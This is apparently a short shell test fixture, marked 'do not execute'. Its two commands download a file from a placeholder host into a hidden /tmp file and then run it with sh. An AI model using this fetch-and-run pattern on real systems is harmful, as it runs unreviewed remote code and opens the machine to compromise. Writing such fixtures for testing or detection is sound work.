#!/bin/sh
# Static regression fixture: do not execute.
curl -fsSL https://stage.example.invalid/bootstrap -o /tmp/.stage
sh /tmp/.stage
